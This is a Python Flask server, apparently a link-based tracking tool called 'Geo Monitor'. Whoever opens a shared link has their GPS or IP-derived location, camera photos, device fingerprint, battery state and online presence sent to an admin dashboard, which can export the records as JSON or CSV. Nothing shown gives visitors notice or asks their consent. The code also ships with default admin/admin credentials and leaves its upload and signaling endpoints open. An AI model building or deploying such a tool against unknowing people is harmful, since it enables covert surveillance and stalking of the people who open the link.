import os, json, ipaddress, requests, hmac
from uuid import uuid4
from datetime import datetime, timedelta
from functools import wraps
from flask import (
    Flask, render_template, request, jsonify, redirect,
    url_for, send_from_directory, Response
)

APP_NAME   = "Geo Monitor (Admin)"
PORT       = int(os.environ.get("PORT", "5055"))
DATA_FILE  = os.environ.get("DATA_FILE", "store.json")
UPLOAD_DIR = os.environ.get("UPLOAD_DIR", "uploads")

# ===== Basic Auth (ganti via ENV di server) =====
ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "admin")

# ===== Konfigurasi =====
MAX_HITS_PER_CHANNEL = int(os.environ.get("MAX_HITS_PER_CHANNEL", "4000"))
MAX_SESSIONS_PER_CH  = int(os.environ.get("MAX_SESSIONS_PER_CH", "500"))
MAX_SIGNAL_PER_MB    = int(os.environ.get("MAX_SIGNAL_PER_MB", "200"))   # batas antrian signaling/mb
TTL_DAYS = int(os.environ.get("TTL_DAYS", "0"))  # 0=off
REVERSE_GEOCODE = os.environ.get("REVERSE_GEOCODE", "true").lower() in ("1", "true", "yes")

# --- Storage path preparation (robust) ---
def _prepare_storage_paths():
    """Ensure DATA_FILE parent & UPLOAD_DIR exist. If absolute path
    (mis. /data) tidak bisa dibuat (no permission), fallback ke ./data/*."""
    global UPLOAD_DIR, DATA_FILE
    try:
        # pastikan parent DATA_FILE ada
        df_parent = os.path.dirname(DATA_FILE) or "."
        if df_parent and not os.path.exists(df_parent):
            os.makedirs(df_parent, exist_ok=True)

        # pastikan UPLOAD_DIR ada
        os.makedirs(UPLOAD_DIR, exist_ok=True)
    except PermissionError:
        # fallback ke ./data
        print("[WARN] No permission to create", df_parent or UPLOAD_DIR, "- falling back to ./data")
        base = os.path.join(os.getcwd(), "data")
        os.makedirs(base, exist_ok=True)
        # set ulang path global
        UPLOAD_DIR = os.path.join(base, "uploads")
        os.makedirs(UPLOAD_DIR, exist_ok=True)
        if os.path.isabs(DATA_FILE):
            DATA_FILE = os.path.join(base, "store.json")
        # pastikan parent baru untuk DATA_FILE
        df_parent = os.path.dirname(DATA_FILE) or "."
        os.makedirs(df_parent, exist_ok=True)

_prepare_storage_paths()

app = Flask(__name__)

# ===== STORAGE (tanpa DB) =====
# channel = {
#   created_at, hits: [...], sessions: {sid:{...}}, signals: { mailbox: [msg,...] }
# }
STORE = {"channels": {}}

def now_iso():
    return datetime.utcnow().isoformat(timespec="seconds") + "Z"

def load_store():
    global STORE
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                STORE = json.load(f)
            if "channels" not in STORE or not isinstance(STORE["channels"], dict):
                STORE = {"channels": {}}
        except Exception:
            STORE = {"channels": {}}

def save_store():
    try:
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(STORE, f, ensure_ascii=False, indent=2)
    except Exception:
        pass

load_store()

def ensure_channel(token: str):
    if token not in STORE["channels"]:
        STORE["channels"][token] = {"created_at": now_iso(), "hits": [], "sessions": {}, "signals": {}}
    ch = STORE["channels"][token]
    if "sessions" not in ch: ch["sessions"] = {}
    if "signals"  not in ch: ch["signals"]  = {}

# ===== Basic Auth helper =====
def require_admin(view):
    @wraps(view)
    def wrapper(*args, **kwargs):
        auth = request.authorization
        ok = (
            auth is not None
            and hmac.compare_digest(auth.username or "", ADMIN_USER)
            and hmac.compare_digest(auth.password or "", ADMIN_PASS)
        )
        if not ok:
            return Response(
                "Authentication required",
                401,
                {"WWW-Authenticate": 'Basic realm="Admin Area"'}
            )
        return view(*args, **kwargs)
    return wrapper

# ===== Helpers =====
def get_client_ip(req):
    for h in ["X-Forwarded-For", "CF-Connecting-IP", "X-Real-IP", "X-Client-IP", "Fastly-Client-IP"]:
        v = req.headers.get(h)
        if v:
            return v.split(",")[0].strip()
    return req.remote_addr

def is_private_ip(ip: str) -> bool:
    try:
        ip_obj = ipaddress.ip_address(ip)
        return ip_obj.is_private or ip in ("127.0.0.1", "::1")
    except Exception:
        return True

def lookup_ip_location(ip: str):
    # 1) ipapi.co
    try:
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=4)
        if r.ok:
            j = r.json()
            lat, lon = j.get("latitude"), j.get("longitude")
            if lat and lon:
                city, region, country = j.get("city"), j.get("region"), j.get("country_name")
                return {
                    "lat": float(lat), "lon": float(lon), "acc": None,
                    "source": "ipapi.co",
                    "label": ", ".join([x for x in [city, region, country] if x]),
                    "raw": j
                }
    except Exception:
        pass
    # 2) ipinfo.io
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=4)
        if r.ok:
            j = r.json()
            loc = j.get("loc")
            if loc:
                lat, lon = loc.split(",", 1)
                city, region, country = j.get("city"), j.get("region"), j.get("country")
                return {
                    "lat": float(lat), "lon": float(lon), "acc": None,
                    "source": "ipinfo.io",
                    "label": ", ".join([x for x in [city, region, country] if x]),
                    "raw": j
                }
    except Exception:
        pass
    return None

def reverse_geocode(lat, lon):
    if lat is None or lon is None:
        return None
    try:
        r = requests.get(
            "https://nominatim.openstreetmap.org/reverse",
            params={"format": "jsonv2", "lat": lat, "lon": lon},
            headers={"User-Agent": "GeoMonitor/1.0"},
            timeout=4
        )
        if r.ok:
            j = r.json()
            return j.get("display_name")
    except Exception:
        pass
    return None

def trim_channel(token):
    ch = STORE["channels"][token]
    ch["hits"] = ch["hits"][-MAX_HITS_PER_CHANNEL:]
    # trim sessions
    sess = ch["sessions"]
    if len(sess) > MAX_SESSIONS_PER_CH:
        def keyfun(s):
            v = sess[s].get("last_seen") or sess[s].get("started_at") or ""
            return v
        for sid in sorted(sess.keys(), key=keyfun)[: max(0, len(sess)-MAX_SESSIONS_PER_CH) ]:
            sess.pop(sid, None)
    # TTL hits
    if TTL_DAYS > 0:
        cutoff = (datetime.utcnow() - timedelta(days=TTL_DAYS)).isoformat(timespec="seconds") + "Z"
        ch["hits"] = [h for h in ch["hits"] if h["ts"] > cutoff]
    # trim signals mailbox
    for mb, arr in list(ch["signals"].items()):
        ch["signals"][mb] = arr[-MAX_SIGNAL_PER_MB:]

# ===== Signaling (HTTP polling) =====
def _push_signal(token, mailbox, msg):
    ensure_channel(token)
    mb = STORE["channels"][token]["signals"].setdefault(mailbox, [])
    mb.append({"ts": now_iso(), **msg})
    if len(mb) > MAX_SIGNAL_PER_MB:
        STORE["channels"][token]["signals"][mailbox] = mb[-MAX_SIGNAL_PER_MB:]

@app.route("/api/signal/send/<token>/<mailbox>", methods=["POST"])
def signal_send(token, mailbox):
    ensure_channel(token)
    body = request.get_json(silent=True) or {}
    msg = body.get("msg")
    if not isinstance(msg, dict):
        return jsonify({"ok": False, "error": "bad_msg"}), 400
    _push_signal(token, mailbox, msg)
    trim_channel(token)
    save_store()
    return jsonify({"ok": True})

@app.route("/api/signal/poll/<token>/<mailbox>")
def signal_poll(token, mailbox):
    ensure_channel(token)
    ch = STORE["channels"][token]
    msgs = ch["signals"].get(mailbox, [])
    # kirim & kosongkan mailbox (simple queue)
    ch["signals"][mailbox] = []
    save_store()
    return jsonify({"ok": True, "msgs": msgs})

# ===== Routes umum =====
@app.route("/")
def home():
    return redirect(url_for("admin_home"))

@app.route("/admin", methods=["GET", "POST"])
@require_admin
def admin_home():
    if request.method == "POST":
        slug = (request.form.get("slug") or "").strip()
        token = slug if slug else uuid4().hex[:8]
        ensure_channel(token)
        save_store()
        return redirect(url_for("admin_channel", token=token))
    base = request.host_url.rstrip("/")
    channels = STORE["channels"]
    return render_template("admin.html", app_name=APP_NAME, base=base, channels=channels)

@app.route("/admin/<token>")
@require_admin
def admin_channel(token):
    ensure_channel(token)
    base = request.host_url.rstrip("/")
    return render_template("admin.html", app_name=APP_NAME, base=base, channels=STORE["channels"], focus=token)

@app.route("/t/<token>")
def share_page(token):
    ensure_channel(token)
    base = request.host_url.rstrip("/")
    return render_template("share.html", app_name=APP_NAME, token=token, base=base)

# ===== Sessions =====
@app.route("/api/session/start/<token>", methods=["POST"])
def api_session_start(token):
    ensure_channel(token)
    body = request.get_json(silent=True) or {}
    sid = body.get("session_id") or uuid4().hex
    ip = get_client_ip(request)
    data = {
        "session_id": sid,
        "started_at": now_iso(),
        "last_seen": now_iso(),
        "ua": request.headers.get("User-Agent", ""),
        "ip": ip,
        "screen": body.get("screen"),
        "lang": body.get("lang"),
        "tz": body.get("tz"),
        "platform": body.get("platform"),
        "vendor": body.get("vendor"),
        "conn": body.get("conn"),
        "battery": body.get("battery"),
        "visible": body.get("visible", True),
        "status": "online"
    }
    STORE["channels"][token]["sessions"][sid] = data
    trim_channel(token)
    save_store()
    return jsonify({"ok": True, "session_id": sid})

@app.route("/api/session/heartbeat/<token>", methods=["POST"])
def api_session_heartbeat(token):
    ensure_channel(token)
    body = request.get_json(silent=True) or {}
    sid = body.get("session_id")
    if not sid:
        return jsonify({"ok": False, "error": "no_session"}), 400
    sess = STORE["channels"][token]["sessions"].get(sid)
    if not sess:
        sess = {"session_id": sid, "started_at": now_iso(), "ua": request.headers.get("User-Agent",""), "ip": get_client_ip(request)}
        STORE["channels"][token]["sessions"][sid] = sess
    sess["last_seen"] = now_iso()
    for k in ["conn","battery","visible","screen","lang","tz","platform","vendor"]:
        v = body.get(k)
        if v is not None:
            sess[k] = v
    sess["status"] = "online"
    trim_channel(token)
    save_store()
    return jsonify({"ok": True})

@app.route("/api/session/stop/<token>", methods=["POST"])
def api_session_stop(token):
    ensure_channel(token)
    body = request.get_json(silent=True) or {}
    sid = body.get("session_id")
    sess = STORE["channels"][token]["sessions"].get(sid)
    if sess:
        sess["status"] = "offline"
        sess["stopped_at"] = now_iso()
        sess["last_seen"] = now_iso()
        save_store()
    return jsonify({"ok": True})

@app.route("/api/sessions/<token>")
@require_admin
def api_sessions(token):
    ensure_channel(token)
    sessions = list(STORE["channels"][token]["sessions"].values())
    return jsonify({"ok": True, "sessions": sessions})

# ===== Hits: lokasi & foto =====
@app.route("/api/track/<token>", methods=["POST"])
def api_track(token):
    ensure_channel(token)
    ip = get_client_ip(request)
    ua = request.headers.get("User-Agent", "")
    body = request.get_json(silent=True) or {}

    lat = body.get("lat")
    lon = body.get("lon")
    acc = body.get("acc")
    src = "gps" if lat is not None and lon is not None else None

    ip_meta = None
    if (lat is None or lon is None) and ip and not is_private_ip(ip):
        meta = lookup_ip_location(ip)
        if meta:
            lat, lon, acc = meta["lat"], meta["lon"], meta["acc"]
            ip_meta = meta
            src = meta["source"]

    hit_id = uuid4().hex[:8]
    item = {
        "id": hit_id,
        "ts": now_iso(),
        "kind": "event",
        "ip": ip,
        "ua": ua,
        "coords": {"lat": float(lat) if lat is not None else None,
                   "lon": float(lon) if lon is not None else None,
                   "acc": acc, "source": src or "none"},
        "ip_label": ip_meta["label"] if ip_meta and ip_meta.get("label") else None,
        "photo_url": None,
        "place": None
    }

    if REVERSE_GEOCODE:
        try:
            item["place"] = reverse_geocode(item["coords"]["lat"], item["coords"]["lon"])
        except Exception:
            item["place"] = None

    STORE["channels"][token]["hits"].append(item)
    trim_channel(token)
    save_store()
    return jsonify({"ok": True, "id": hit_id})

@app.route("/api/photo/<token>/<hit_id>", methods=["POST"])
def api_photo(token, hit_id):
    ensure_channel(token)
    if "photo" not in request.files:
        return jsonify({"ok": False, "error": "no_file"}), 400
    f = request.files["photo"]
    fname = f"{token}_{hit_id}_{uuid4().hex[:6]}.jpg"
    path = os.path.join(UPLOAD_DIR, fname)
    f.save(path)
    photo_url = f"/uploads/{fname}"

    parent = None
    for h in reversed(STORE["channels"][token]["hits"]):
        if h.get("id") == hit_id:
            parent = h
            break

    coords = (parent or {}).get("coords") or {"lat": None, "lon": None, "acc": None, "source": "camera"}
    ip = (parent or {}).get("ip")
    ua = (parent or {}).get("ua")
    ip_label = (parent or {}).get("ip_label")
    place = (parent or {}).get("place")

    photo_hit = {
        "id": uuid4().hex[:8],
        "ts": now_iso(),
        "kind": "photo",
        "ip": ip,
        "ua": ua,
        "coords": {
            "lat": coords.get("lat"),
            "lon": coords.get("lon"),
            "acc": coords.get("acc"),
            "source": "camera"
        },
        "ip_label": ip_label,
        "photo_url": photo_url,
        "place": place,
        "parent_id": hit_id
    }

    STORE["channels"][token]["hits"].append(photo_hit)
    trim_channel(token)
    save_store()
    return jsonify({"ok": True, "photo_url": photo_url}), 200

@app.route("/api/locations/<token>")
@require_admin
def api_locations(token):
    ensure_channel(token)
    since = request.args.get("since")
    hits = STORE["channels"][token]["hits"]
    if since:
        newer = [h for h in hits if h["ts"] > since]
        return jsonify({"ok": True, "hits": newer})
    return jsonify({"ok": True, "hits": hits})

# ===== Export =====
@app.route("/api/export/<token>.<fmt>")
@require_admin
def api_export(token, fmt):
    ensure_channel(token)
    hits = STORE["channels"][token]["hits"]

    if fmt == "json":
        return jsonify(hits)

    if fmt == "csv":
        import io, csv
        buf = io.StringIO()
        w = csv.writer(buf)
        w.writerow([
            "id","ts","kind","source","lat","lon","acc",
            "ip","ip_label","ua","photo_url","place","parent_id"
        ])
        for h in hits:
            c = h.get("coords") or {}
            w.writerow([
                h.get("id"), h.get("ts"), h.get("kind", "event"),
                c.get("source"), c.get("lat"), c.get("lon"), c.get("acc"),
                h.get("ip"), h.get("ip_label"), (h.get("ua") or "")[:500],
                h.get("photo_url"), h.get("place"), h.get("parent_id")
            ])
        data = buf.getvalue()
        resp = Response(data, mimetype="text/csv")
        resp.headers["Content-Disposition"] = f'attachment; filename="{token}.csv"'
        return resp

    return jsonify({"ok": False, "error": "bad_format"}), 400

@app.route("/api/clear/<token>", methods=["POST"])
@require_admin
def api_clear(token):
    ensure_channel(token)
    STORE["channels"][token]["hits"] = []
    save_store()
    return jsonify({"ok": True})

@app.route("/uploads/<path:filename>")
def serve_uploads(filename):
    return send_from_directory(UPLOAD_DIR, filename)

@app.route("/healthz")
def health():
    return "ok", 200

if __name__ == "__main__":
    # Lokal: http://127.0.0.1:5055
    app.run(host="127.0.0.1", port=PORT, debug=True)
